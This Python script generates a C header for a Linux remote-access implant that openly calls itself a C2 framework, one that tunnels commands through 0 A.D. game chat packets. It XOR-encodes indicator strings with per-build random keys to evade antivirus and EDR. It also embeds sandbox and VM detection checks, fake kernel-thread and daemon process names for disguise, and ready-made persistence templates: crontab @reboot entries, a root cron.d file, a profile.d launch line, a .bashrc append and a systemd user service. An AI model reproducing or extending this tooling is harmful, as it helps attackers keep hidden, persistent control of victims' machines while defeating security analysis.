#!/usr/bin/env python3
"""
gen_agent_iocs.py — Build-time generator for obf_agent_iocs.h
==============================================================

PURPOSE
-------
This script is run once at compile time (by the Makefile) to produce
a C header file called ``obf_agent_iocs.h``.  That header is then
#included by the agent's C source code.

WHAT IS AN IOC?
---------------
IOC stands for "Indicator of Compromise".  When a security analyst
or antivirus scans a binary file, they look for recognisable strings
and byte patterns — these are IOCs.  Examples:
  - The literal string "/proc/self/exe" in a binary immediately
    signals that the program is inspecting itself (suspicious).
  - The string "VirtualBox" suggests the program is checking whether
    it runs inside a virtual machine (also suspicious).

WHY OBFUSCATE?
--------------
If we store those strings as plain text inside the compiled binary,
any AV or EDR can flag the binary immediately just by scanning for
known strings.  To defeat that, we XOR-encode every string before
embedding it.  The plaintext never appears in the compiled binary;
instead only scrambled bytes exist.  At runtime the C code XOR-decodes
the bytes back into the original string, uses it, and discards it.

HOW THE XOR KEY WORKS
---------------------
A simple XOR with a fixed key would still be easy to detect: an
analyst would notice all the strings look XOR-encoded and could
brute-force the single-byte key in 255 tries.

To make it harder we:
  1. Pick a RANDOM key on every build (so every build looks different).
  2. Split the key into two 4-bit halves (nibbles) stored in SEPARATE
     volatile variables (_k_xx_hi and _k_xx_lo).  The compiler cannot
     merge them back into a constant because ``volatile`` tells it the
     variables may change at any moment.  This prevents the compiler
     from optimising away the XOR at compile time (constant folding).
  3. The C macro SB_KEY = (hi << 4) | lo reconstructs the full byte
     at runtime only, making static analysis harder.

TWO SEPARATE KEY DOMAINS
-------------------------
We use two independent random keys:
  - SB_KEY : for "sandbox detection" strings and all other agent
             strings (file paths, protocol messages, etc.)
  - PN_KEY : for "process name" strings — the fake kernel thread
             names the agent uses to camouflage itself, and the
             player names used as the NMT_CHAT sender field in the
             0 A.D. game protocol.

WHY PLAYER NAMES?
-----------------
This C2 framework hides traffic inside 0 A.D. (a real-time strategy
game) network packets.  The NMT_CHAT packet type contains a "sender"
field that appears as a player name.  By sending C2 commands as chat
messages from a convincing player name, the traffic blends in with
legitimate game traffic.  The names are randomised per build so every
deployment of the agent looks different on the wire.

WHAT DOES THE GENERATED HEADER LOOK LIKE?
------------------------------------------
For each string we output a C array like:
    static const uint8_t _sb_uptime[] = {0xAB, 0xCD, ...};
The bytes 0xAB, 0xCD, etc. are the original characters XOR'd with the
key.  At runtime the agent calls a decode function to recover the
original string.

Usage: python3 gen_agent_iocs.py <output.h>
"""
import sys, secrets, string

# ── Argument check ─────────────────────────────────────────────────────────────
# This script expects exactly one command-line argument: the path where the
# generated header file should be written.
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <output.h>")
    sys.exit(1)

out_path = sys.argv[1]  # e.g. "src/obf_agent_iocs.h"

# ── Generate random XOR keys ───────────────────────────────────────────────────
# secrets.randbelow(0x7F) returns a cryptographically-random integer in [0, 127).
# Adding 0x80 shifts the range to [0x80, 0xFF] (128-255).  We avoid values below
# 0x80 because some of those collide with printable ASCII, which would make parts
# of the encoded data look like readable text to a casual scan.
SB_KEY = secrets.randbelow(0x7F) + 0x80   # Sandbox-detection strings key: 0x80-0xFF
PN_KEY = secrets.randbelow(0x7F) + 0x80   # Process-name / player-name strings key

# ── Split each key into two nibbles ───────────────────────────────────────────
# A nibble is half a byte (4 bits).  We split the 8-bit key into:
#   - HI: the upper 4 bits (bits 7-4), obtained by right-shifting 4 positions
#   - LO: the lower 4 bits (bits 3-0), obtained by ANDing with 0xF
# Each nibble is stored in its own C volatile variable.  The C code then
# reconstructs: key = (hi << 4) | lo — but only at runtime.
# This means the full key never appears as a literal constant in the binary.
SB_HI  = (SB_KEY >> 4) & 0xF   # Upper nibble of the sandbox key
SB_LO  = SB_KEY & 0xF          # Lower nibble of the sandbox key
PN_HI  = (PN_KEY >> 4) & 0xF   # Upper nibble of the process-name key
PN_LO  = PN_KEY & 0xF          # Lower nibble of the process-name key

# ── Helper: XOR-encode a string ───────────────────────────────────────────────

def enc_hex(s, key):
    """
    XOR-encode a string (or bytes) with the given single-byte key.

    Each byte of the input string is XOR'd with ``key`` and formatted as
    a two-digit hex literal (e.g. "0x3F").  The results are joined with
    commas, ready to be placed inside a C array initialiser.

    Example:
        enc_hex("AB", 0xAA)
        -> "0xEB,0xE8"   (0x41^0xAA=0xEB, 0x42^0xAA=0xE8)
    """
    # Ensure we are working with bytes, not a Python str.
    bs = s.encode('utf-8') if isinstance(s, str) else s
    return ','.join(f'0x{b ^ key:02X}' for b in bs)


# ── Helper: emit one C array line ─────────────────────────────────────────────

def arr_line(name, s, key):
    """
    Produce a complete C static array declaration for one encoded string.

    The result looks like:
        static const uint8_t _sb_uptime[]={0xXX,0xYY,...};
    Note: there is deliberately no null terminator — the C code uses the
    explicit byte length, not strlen(), so we do not need one.
    """
    return f"static const uint8_t {name}[]=" + "{" + enc_hex(s, key) + "};"


# ── Helper: emit a C struct array (lookup table) ───────────────────────────────

def table_line(type_decl, table_name, entries):
    """
    Produce a C array of structs that acts as a lookup table.

    Parameters
    ----------
    type_decl   : C struct field declarations as a string, e.g.
                  "const uint8_t *d; uint8_t n"
    table_name  : the name of the resulting C array variable
    entries     : list of (c_array_name, byte_length) tuples

    The emitted C code is an anonymous struct array where each element
    holds a pointer to one encoded byte array and the length of that
    array.  At runtime the agent iterates this table to compare strings
    without ever having the plaintext in a searchable form.
    """
    inner = ",".join("{" + f"{n},{l}" + "}" for n, l in entries)
    return "static const struct {" + type_decl + ";} " + table_name + "[]={" + inner + "};"


# ── Start building the output lines ───────────────────────────────────────────
out = []
out.append("/* AUTO-GENERATED by gen_agent_iocs.py — do not edit */")
out.append("")

# ── Sandbox-detection key (SB_KEY) — stored as split nibbles ──────────────────
# The ``volatile`` keyword is crucial: it prevents the C compiler from treating
# these variables as compile-time constants (even at optimisation level -O2).
# Without ``volatile`` the compiler could compute (hi<<4)|lo at compile time
# and embed the result directly, making it visible in the binary.
out.append(f"static volatile uint8_t _k_sb_hi = 0x{SB_HI:01X}u;")
out.append(f"static volatile uint8_t _k_sb_lo = 0x{SB_LO:01X}u;")
# This macro reconstructs the full key byte at runtime by combining the nibbles.
out.append("#define SB_KEY ((uint8_t)((_k_sb_hi << 4) | _k_sb_lo))")
out.append("")

# ── Sandbox-detection strings ─────────────────────────────────────────────────
# These are file paths and keywords that the agent reads at startup to decide
# whether it is running inside a security analysis environment (sandbox):
#   - /proc/uptime      : low uptime (<3 min) suggests a freshly-booted sandbox
#   - /proc/self/status : contains TracerPid, which is non-zero if the process
#                         is being debugged by gdb, strace, etc.
#   - /sys/class/dmi/id/product_name : hardware vendor name; "VirtualBox",
#                         "VMware", "QEMU" etc. appear here in virtual machines
#   - /proc/cpuinfo     : CPU count; sandboxes often have only 1 CPU
#   - /proc/meminfo     : RAM amount; sandboxes often have very little RAM
#   - memfd / (deleted) : signs that the agent itself was loaded from memory
#                         (memfd_create) and has no on-disk path
sb = [
    ("_sb_uptime",       "/proc/uptime"),          # file: system uptime in seconds
    ("_sb_status",       "/proc/self/status"),     # file: process metadata incl. TracerPid
    ("_sb_tracerpid",    "TracerPid:"),            # keyword inside /proc/self/status; non-zero = debugger attached
    ("_sb_dmi",          "/sys/class/dmi/id/product_name"),  # hardware product name from firmware
    ("_sb_cpuinfo",      "/proc/cpuinfo"),         # file: CPU details
    ("_sb_processor",    "processor"),             # keyword to count CPU cores in /proc/cpuinfo
    ("_sb_meminfo",      "/proc/meminfo"),         # file: memory statistics
    ("_sb_memtotal",     "MemTotal: "),            # keyword to extract total RAM; 10 chars with trailing space
    ("_sb_proc",         "/proc"),                 # root of the process filesystem
    ("_sb_self_exe",     "/proc/self/exe"),        # symlink to the agent's own executable on disk
    ("_sb_memfd",        "memfd"),                 # prefix used by anonymous memory-file descriptors
    ("_sb_deleted",      "(deleted)"),             # suffix in /proc/self/exe when the file is removed after exec
    ("_sb_memfd_colon",  "/memfd:"),               # path prefix for memfd_create()-based file descriptors
]

# Encode every sandbox-detection string and emit it as a C array.
for name, s in sb:
    out.append(arr_line(name, s, SB_KEY))

out.append("")

# ── Virtual-machine vendor strings ────────────────────────────────────────────
# The agent reads the DMI product name (from /sys/class/dmi/id/product_name)
# and the CPU model string (from /proc/cpuinfo) and compares them against
# these known VM vendor names.  If a match is found the agent assumes it is
# inside a sandbox and exits cleanly, leaving no trace.
vm = [
    ("_sb_vbox",    "VirtualBox"),              # Oracle VirtualBox hypervisor
    ("_sb_vmware",  "VMware"),                  # VMware Workstation / ESXi
    ("_sb_qemu",    "QEMU"),                    # Quick EMUlator (often used by analysts)
    ("_sb_bochs",   "Bochs"),                   # Bochs x86 emulator
    ("_sb_xen",     "Xen"),                     # Xen hypervisor (used by AWS, etc.)
    ("_sb_kvm",     "KVM"),                     # Kernel-based Virtual Machine (Linux)
    ("_sb_msft",    "Microsoft Corporation"),   # Hyper-V DMI vendor field (21 chars)
    ("_sb_inno",    "innotek"),                 # Former VirtualBox developer name in DMI
    ("_sb_oracle",  "Oracle"),                  # Oracle branding (VirtualBox / cloud VMs)
]

# Encode each VM-vendor string with the sandbox key.
for name, s in vm:
    out.append(arr_line(name, s, SB_KEY))

# Emit the VM lookup table: an array of structs, each holding a pointer to an
# encoded VM-vendor byte array and that array's length.  The agent iterates
# this table at startup and XOR-decodes each entry just long enough to compare
# it against the live DMI string, then discards the decoded bytes.
out.append(table_line("const uint8_t *d; uint8_t n", "VM_ENC",
                       [(name, len(s.encode('utf-8'))) for name, s in vm]))
out.append("")

# ── Process-name key (PN_KEY) ─────────────────────────────────────────────────
# A completely independent key for process-name and player-name strings.
# Using a separate key means that even if an analyst recovers SB_KEY by
# analysing the sandbox-detection logic, they still cannot decode the
# process names or player names without finding PN_KEY separately.
out.append(f"static volatile uint8_t _k_pn_hi = 0x{PN_HI:01X}u;")
out.append(f"static volatile uint8_t _k_pn_lo = 0x{PN_LO:01X}u;")
out.append("#define PN_KEY ((uint8_t)((_k_pn_hi << 4) | _k_pn_lo))")
out.append("")

# ── Fake kernel-thread names (kworker pool) ───────────────────────────────────
# On Linux, the process name is visible in tools like ``ps``, ``top``, and
# ``/proc/<pid>/comm``.  The agent changes its own process name (using the
# prctl() syscall) to look like a legitimate kernel worker thread.
# These are real names that appear on a normal Linux system, so the agent's
# process blends in with the hundreds of legitimate kworker threads.
kworkers = [
    ("_kw0", "kworker/0:1H"),    # high-priority kernel worker on CPU 0
    ("_kw1", "kworker/1:2"),     # normal kernel worker on CPU 1
    ("_kw2", "kworker/u4:3"),    # unbound kernel worker (pool 4, thread 3)
    ("_kw3", "kworker/0:0H"),    # high-priority kernel worker on CPU 0, thread 0
    ("_kw4", "migration/0"),     # kernel process that migrates tasks between CPUs
    ("_kw5", "kcompactd0"),      # kernel memory compaction daemon
    ("_kw6", "kswapd0"),         # kernel swap daemon (moves pages to disk)
    ("_kw7", "kthreadd"),        # the parent of all kernel threads (PID 2)
]

# ── Fake system daemon names ──────────────────────────────────────────────────
# Alternatively the agent may disguise itself as one of these common system
# daemons (background services) that are present on virtually every Linux
# system.  They are far less suspicious than an unknown process name.
daemons = [
    ("_dm0", "systemd-journald"),    # systemd logging service
    ("_dm1", "dbus-daemon"),         # D-Bus inter-process communication daemon
    ("_dm2", "NetworkManager"),      # network configuration manager
    ("_dm3", "polkitd"),             # PolicyKit privilege escalation framework
    ("_dm4", "rtkit-daemon"),        # real-time scheduling policy daemon
    ("_dm5", "accounts-daemon"),     # user account information service
    ("_dm6", "udisksd"),             # disk management daemon (mounts/unmounts)
    ("_dm7", "bluetoothd"),          # Bluetooth management daemon
]

# Encode each kworker name with PN_KEY and emit as a C array.
for name, s in kworkers:
    out.append(arr_line(name, s, PN_KEY))

# Lookup table so C code can pick a kworker name at runtime without knowing
# the actual string — it just picks an index and decodes that entry.
out.append(table_line("const uint8_t *d; uint8_t n", "KWORKER_ENC",
                       [(name, len(s.encode('utf-8'))) for name, s in kworkers]))
out.append("")

# Encode each daemon name and emit as a C array.
for name, s in daemons:
    out.append(arr_line(name, s, PN_KEY))

# Same lookup table pattern for daemon names.
out.append(table_line("const uint8_t *d; uint8_t n", "DAEMON_ENC",
                       [(name, len(s.encode('utf-8'))) for name, s in daemons]))
out.append("")

# ── C2 protocol strings ────────────────────────────────────────────────────────
# These are the messages that flow between the agent (on the victim machine)
# and the C2 server (the attacker's machine).  They are embedded in 0 A.D.
# NMT_CHAT game packets so the traffic looks like in-game chat.
# Because they would be obvious IOCs ("DH_OK", "ERR: fork", etc.) they are
# all encoded with SB_KEY.
proto_strings = [
    ("_sb_dhok",         "DH_OK"),                      # server acknowledges Diffie-Hellman key exchange success
    ("_sb_errtoomany",   "ERR: too many jobs (max 8)"), # agent already has 8 background jobs running
    # Root-level command method names (the "verb" in the C2 protocol)
    ("_sb_m_syscron",    "syscron"),    # command: install a system-level cron persistence entry
    ("_sb_m_profile",    "profile"),   # command: install a /etc/profile.d persistence entry
    # Responses sent back to the C2 server after executing "syscron"
    ("_sb_syscronok",    "syscron OK\xe2\x86\x92%s"),   # success; \xe2\x86\x92 is the UTF-8 right-arrow →
    ("_sb_syscronerr",   "syscron ERR"),                 # failure
    # Responses for the "profile" command
    ("_sb_profileok",    "profile OK\xe2\x86\x92%s"),
    ("_sb_profileerr",   "profile ERR"),
    # Generic error messages for common failure modes
    ("_sb_errpipe",      "ERR: pipe"),                   # pipe() syscall failed
    ("_sb_errfork",      "ERR: fork"),                   # fork() syscall failed
    ("_sb_erropen",      "ERR:open '%s'"),               # open() failed on a file path
    ("_sb_errempty",     "ERR:file empty or >4MB"),      # file too large to upload
    ("_sb_errread",      "ERR:read failed"),             # read() returned an error
    ("_sb_errlink",      "ERR:readlink"),                # readlink() failed
    ("_sb_errcopy",      "ERR:copy"),                    # file copy failed
    ("_sb_errmkdir",     "ERR:mkdir"),                   # directory creation failed
    ("_sb_errunknown",   "ERR:unknown '%s'"),            # unrecognised command verb received
    ("_sb_ulerr",        "UL ERR: '%s'"),                # file upload (UL) error
    ("_sb_ulok",         "UL OK: %s"),                   # file upload success
    # Names of persistence sub-commands
    ("_sb_m_cron",       "cron"),       # install a user crontab entry for persistence
    ("_sb_m_bashrc",     "bashrc"),     # append a launch line to ~/.bashrc for persistence
    ("_sb_m_systemd",    "systemd"),    # install a systemd user service unit for persistence
    # Persistence sub-command responses
    ("_sb_cronok",       "cron OK\xe2\x86\x92%s"),
    ("_sb_cronerr",      "cron ERR\xe2\x86\x92%s"),
    ("_sb_bashrcok",     "bashrc OK\xe2\x86\x92%s"),
    ("_sb_bashrcfail",   "bashrc FAILED"),
    ("_sb_sysdok",       "systemd OK\xe2\x86\x92%s"),
    ("_sb_sysdfail",     "systemd FAILED"),
    # The crontab command template — very suspicious if found in plaintext.
    # %s placeholders are filled in at runtime with actual paths and arguments.
    ("_sb_cron_cmd",     "(crontab -l 2>/dev/null|grep -v '%s';"
                         "echo '@reboot %s %s %d \"%s\" \"%s\" >/dev/null 2>&1')|crontab -"),
    # Strings that appear in ``strings(1)`` output if not encoded
    ("_sb_sysinfo_fmt",  "id=%s|h=%s|u=%s|a=%s|r=%s|pid=%d|dh=%d"),  # sysinfo beacon format
    ("_sb_shell_wrap",   "{ %s; } 2>&1"),    # wrap a shell command to capture stderr too
    ("_sb_sleep_cmd",    "sleep:"),           # C2 command prefix: put agent to sleep
    ("_sb_persist_cmd",  "persist:"),         # C2 command prefix: install persistence
]

out.append("/* Protocol strings (SB_KEY) */")
for name, s in proto_strings:
    out.append(arr_line(name, s, SB_KEY))
out.append("")

# ── Persistence file paths and service unit content ────────────────────────────
# "Persistence" means making the agent survive a reboot.  These strings are
# the file paths and shell commands needed to install the three persistence
# mechanisms.  They are especially sensitive IOCs and must be hidden.
persist_strings = [
    # Systemd user service paths (%s is replaced with $HOME at runtime)
    ("_ps_config_systemd",  "%s/.config/systemd/user"),          # directory for user systemd units
    ("_ps_cache_svc",       "cache-svc.service"),                # fake service unit filename
    ("_ps_cache_svc_id",    "cache-svc"),                        # service name without .service suffix
    ("_ps_bashrc",          "%s/.bashrc"),                       # user's shell startup script
    ("_ps_local_share",     "%s/.local/share/.svc-%08x"),        # hidden binary drop location (hex suffix = random)
    ("_ps_svc_reload",      "systemctl --user daemon-reload 2>/dev/null"),  # reload unit files
    ("_ps_svc_enable",      "systemctl --user enable --now cache-svc 2>/dev/null"),  # start + enable on boot
    # Root-only persistence paths (requires root privilege escalation first)
    ("_ps_syscron_path",    "/etc/cron.d/sysupd"),               # system cron drop location
    ("_ps_profile_path",    "/etc/profile.d/sysnet.sh"),         # runs for every login shell on the system
    ("_ps_root_dest",       "/usr/local/lib/.cache/svc-%08x"),   # hidden root binary location
    ("_ps_syscron_entry",   "@reboot root %s %s %d \"%s\" \"%s\" >/dev/null 2>&1\n"),  # cron entry that runs as root on boot
    ("_ps_profile_entry",   "test -x '%s' && '%s' %s %d \"%s\" \"%s\" >/dev/null 2>&1 &\n"),  # profile.d launch line
    # Shell command templates executed to install persistence
    ("_ps_install_fmt",   "mkdir -p \"$(dirname '%s')\" && cp '%s' '%s' && chmod 755 '%s' 2>&1"),  # copy binary into place
    ("_ps_mkdir_ud",      "mkdir -p '%s'"),                       # create directory tree if missing
    ("_ps_bashrc_health", '\n# health\n(%s %s %d "%s" "%s" >/dev/null 2>&1 &)\n'),  # line appended to .bashrc
    # Full systemd unit file template (goes into cache-svc.service)
    ("_ps_unit_template", "[Unit]\nDescription=Cache Service\nAfter=network.target\n\n"
                          "[Service]\nType=simple\nRestart=always\nRestartSec=30\n"
                          'ExecStart=%s %s %d "%s" "%s"\n\n'
                          "[Install]\nWantedBy=default.target\n"),
]

out.append("/* Persistence strings (SB_KEY) */")
for name, s in persist_strings:
    out.append(arr_line(name, s, SB_KEY))
out.append("")

# ── Polymorphic player names ───────────────────────────────────────────────────
# 0 A.D. NMT_CHAT packets include a "player name" (the sender of the chat
# message).  The C2 protocol embeds commands and responses inside these chat
# messages.  To make every deployment look different on a network capture,
# we pick 20 player names at random from a large pool of historical names
# and game-style aliases, then mutate each one (add random letters/digits),
# and XOR-encode them with PN_KEY.
#
# The agent picks one of these encoded names at runtime and sets it as:
#   1. The process name visible in ``ps`` (via prctl PR_SET_NAME)
#   2. The sender field in outbound NMT_CHAT packets
# This way "ps aux" shows a plausible-looking player name and the network
# traffic looks like a real game session.

PLAYER_POOL = [
    # Antiquity / strategy — lowercase, 0AD pseudo style
    "caesar","brutus","scipio","hannibal","leonidas","pompey","cicero","marcus",
    "julius","crassus","sulla","marius","trajan","hadrian","nerva","domitian",
    "vespasian","tiberius","caligula","claudius","nero","galba","otho","vitellius",
    "pertinax","didius","severus","caracalla","macrinus","diadumenian","heliogabalus",
    "alexander","maximinus","gordian","balbinus","pupienus","decius","gallus",
    "valerian","gallienus","claudius2","aurelian","tacitus","florian","probus",
    "carus","carinus","numerian","diocletian","maximian","constantius","galerius",
    "constantine","crispus","fausta","licinius","constans","julian","jovian",
    "valentinian","valens","gratian","maximus","eugenius","theodosius","arcadius",
    "honorius","stilicho","alaric","ataulf","wallia","theodoric","attila","aetius",
    "boniface","majorian","ricimer","glycerius","romulus","odoacer","clovis",
    "belisarius","narses","justinian","theodoric2","alboin","chilperic","guntram",
    "sigebert","brunhilda","fredegund","clotaire","dagobert","pepin","carloman",
    "charlemagne","lothair","rollo","harold","canute","richard","saladin","baibars",
    "timur","genghis","kublai","ogedei","batu","hulegu","berke","nogai",
    # Greek / Hellenistic
    "pericles","themistocles","aristides","miltiades","alcibiades","lysander",
    "agesilaus","epaminondas","pelopidas","demosthenes","aeschines","isocrates",
    "alexander2","antigonus","seleucus","ptolemy","lysimachus","pyrrhus","demetrius",
    "cassander","eumenes","craterus","perdiccas","antipater","pausanias","cleomenes",
    # Carthage / Phoenicia / Persia
    "hamilcar","hasdrubal","mago","bomilcar","gisco","himilco","maharbal",
    "darius","xerxes","artaxerxes","cyrus","cambyses","bardiya","pissuthnes",
    "tissaphernes","pharnabazus","artabazus","memnon","barsine","ochus","bessus",
    # Republican Rome / early empire
    "fabius","quintus","publius","lucius","gaius","titus","gnaeus","sextus",
    "spurius","mamercus","agrippa","maecenas","drusus","germanicus","caecina",
    # Gamer pseudo styles
    "nomad","xorion","ramses","archon","trojan","spartan","attila99","maximus",
    "legatus","centurion","decanus","triarius","hastatus","velites","equites",
    "auxilia","sagittarius","ballistarius","scorpion","onager","catapulta",
]

# Use Python's cryptographically-seeded SystemRandom so name selection is
# unpredictable.  (The regular ``random`` module uses a predictable seed.)
rng = secrets.SystemRandom()
N_PLAYERS = 20   # number of player names to embed per build


def mutate_name(base):
    """
    Take a base name (e.g. "caesar") and return a mutated version.

    Mutation makes each build's player names unique even if the same base
    is selected twice across two different builds.  The mutator randomly:
      - appends or prepends a short run of lowercase letters, OR
      - appends or prepends digits, OR
      - does both (in a random order around the base)

    This means "caesar" might become "3caesar", "caesarxk", "2xcaesar7",
    etc. — all plausible gamer tags that do not repeat across builds.
    """
    mode = rng.choice(['letters', 'digits', 'both'])  # randomly pick mutation type
    lc = string.ascii_lowercase   # 'abcdefghijklmnopqrstuvwxyz'
    dg = string.digits            # '0123456789'

    if mode == 'letters':
        # Add 1-4 random lowercase letters
        part = ''.join(rng.choices(lc, k=rng.randint(1, 4)))
        addon_a, addon_b = part, None
    elif mode == 'digits':
        # Add 1-4 random digits
        part = ''.join(rng.choices(dg, k=rng.randint(1, 4)))
        addon_a, addon_b = part, None
    else:
        # Add both 1-3 letters AND 1-3 digits, in a random order
        letters = ''.join(rng.choices(lc, k=rng.randint(1, 3)))
        digits  = ''.join(rng.choices(dg, k=rng.randint(1, 3)))
        if rng.randint(0, 1):
            addon_a, addon_b = letters, digits
        else:
            addon_a, addon_b = digits, letters

    if addon_b is None:
        # Single addon: place before or after the base name
        if rng.randint(0, 1):
            return base + addon_a   # e.g. "caesar3x"
        else:
            return addon_a + base   # e.g. "3xcaesar"
    else:
        # Two addons: distribute them around the base in one of four ways
        place = rng.randint(0, 3)
        if place == 0:   return addon_a + base + addon_b   # "abc" + "caesar" + "12"
        elif place == 1: return addon_b + base + addon_a   # "12" + "caesar" + "abc"
        elif place == 2: return addon_a + addon_b + base   # "abc12" + "caesar"
        else:            return base + addon_a + addon_b   # "caesar" + "abc12"


# ── Select and encode player names ────────────────────────────────────────────
# rng.sample picks N_PLAYERS unique bases from the pool (no repeats).
selected_bases = rng.sample(PLAYER_POOL, N_PLAYERS)
# Mutate each selected base to produce a unique gamer tag.
player_names   = [mutate_name(b) for b in selected_bases]
# prctl(PR_SET_NAME) is limited to 15 characters, and the NMT_CHAT g_player
# field is 64 bytes.  Truncate at 31 characters to be safe in both contexts.
player_names = [n[:31] for n in player_names]

# Build a list of (C_variable_name, player_name_string) tuples.
players = [(f"_pn{i}", player_names[i]) for i in range(N_PLAYERS)]

out.append("/* Polymorphic player names (PN_KEY) — {} names drawn at random + mutated */".format(N_PLAYERS))
# Emit each player name as an XOR-encoded C byte array.
for name, s in players:
    out.append(arr_line(name, s, PN_KEY))

# Emit a lookup table so the agent can iterate all player names at runtime.
out.append(table_line("const uint8_t *d; uint8_t n", "PLAYER_ENC",
                       [(name, len(s.encode('utf-8'))) for name, s in players]))
# Total count as a C macro so the agent knows the table size.
out.append(f"#define N_PLAYER_ENC {N_PLAYERS}u")
out.append("")

# ── Write the output header file ───────────────────────────────────────────────
with open(out_path, 'w') as f:
    f.write('\n'.join(out) + '\n')

print(f"[*] {out_path}: IOCs regenerated ({N_PLAYERS} player names)")
